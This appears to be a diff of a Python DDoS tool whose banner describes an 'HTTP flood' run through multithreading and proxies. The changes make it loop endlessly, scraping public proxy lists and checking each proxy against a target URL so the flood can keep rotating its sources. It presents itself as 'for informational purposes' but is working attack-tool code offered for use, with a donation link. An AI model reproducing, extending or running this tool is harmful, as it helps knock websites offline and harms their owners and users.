@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 # Dev: FSystem88
-# Version: 4
+# Version: 5
 
 import requests as r, os, threading, random, click, fake_headers
 from threading import Thread
@@ -18,7 +18,7 @@ def logo():
 	print(Fore.GREEN+"\n██████"+Fore.RED+"╗░"+Fore.GREEN+"██████"+Fore.RED+"╗░░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╗"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║╚"+Fore.GREEN+"█████"+Fore.RED+"╗░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║░╚═══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══╝░░"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝╚"+Fore.GREEN+"█████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"\n"+Fore.RED+"╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝"+Fore.YELLOW+"\n\n[ Dev: FSystem88 ~ prod. by Ca$h&Мир ]\n[ The program uses a simple type of DDoS attack\n  \"HTTP flood\" using multithreading and a proxies ]\n[ The program was created for informational purposes !!! ]\n\n"+Fore.GREEN+"[  Qiwi: https://qiwi.com/n/FSYSTEM88  ]\n"+Style.RESET_ALL)
 
 def check_prox(array, url):
-	ip = r.post("http://fsystem88.ru/ip").text
+	ip = r.post("http://ip.beget.ru/").text
 	for prox in array:
 		thread_list = []
 		t = threading.Thread (target=check, args=(ip, prox, url))
@@ -27,7 +27,7 @@ def check_prox(array, url):
 
 def check(ip, prox, url):
 	try:
-		ipx = r.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
+		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
 	except:
 		ipx = ip
 	if ip != ipx:
@@ -69,23 +69,17 @@ def main(proxy, url):
 		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
 		exit()
 	if proxy == None:
-		req = r.get("https://api.proxyscrape.com/?request=displayproxies")
-		array = req.text.split()
-		check_prox(array, url)
+		while True:
+			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
+			array = req.text.split()
+			print(Back.YELLOW+Fore.WHITE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
+			check_prox(array, url)
 	else:
 		try:
 			fx = open(proxy)
 			array = fx.read().split()
-			qtime = input("Found {} proxies in {}.\nTimeout of requests (default 5): ".format(len(array), proxy))
-			try:
-				if qtime == "":
-					qtime = 5
-				else:
-					qtime = int(qtime)
-			except:
-				print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
-				exit()
-			check_prox(array, qtime, url)
+			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
+			check_prox(array, url)
 		except FileNotFoundError:
 			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
 			exit()
